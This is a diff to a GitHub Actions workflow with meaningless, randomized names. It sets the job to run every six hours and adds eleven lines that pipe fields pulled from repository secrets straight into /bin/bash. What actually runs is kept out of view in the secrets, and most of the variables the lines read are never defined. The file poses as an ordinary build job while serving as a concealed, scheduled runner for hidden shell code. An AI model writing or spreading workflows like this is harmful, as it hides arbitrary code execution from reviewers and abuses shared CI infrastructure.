@@ -1,22 +1,26 @@
 name: fullycriticism
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 1/6 * * *'
+    - cron: '25 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fullycriticism
         env:
-          byoll1032: ${{ secrets.byoll1032 }}
+          vvi4: ${{ secrets.vvi4 }}
         run: |
-          echo $byoll1032 | jq -r .shqs14683 | /bin/bash
-          echo $u44 | jq -r .fu216 | /bin/bash
-          echo $kk8735 | jq -r .dcx8 | /bin/bash
-          echo $st44 | jq -r .qg08 | /bin/bash
-          echo $rnr9 | jq -r .nk42 | /bin/bash
+          echo $vvi4 | jq -r .jtpo325 | /bin/bash
+          echo $sy6255 | jq -r .s9 | /bin/bash
+          echo $d58 | jq -r .zb4139 | /bin/bash
+          echo $w40467 | jq -r .fdo080 | /bin/bash
+          echo $r338 | jq -r .kep46366 | /bin/bash
+          echo $kvvyw2 | jq -r .x08690 | /bin/bash
+          echo $ql5 | jq -r .mm45 | /bin/bash
+          echo $ehae0 | jq -r .wii42 | /bin/bash
+          echo $q2 | jq -r .sifm836 | /bin/bash
+          echo $dcl1 | jq -r .qto2 | /bin/bash
+          echo $ktb6506 | jq -r .e40346 | /bin/bash
 
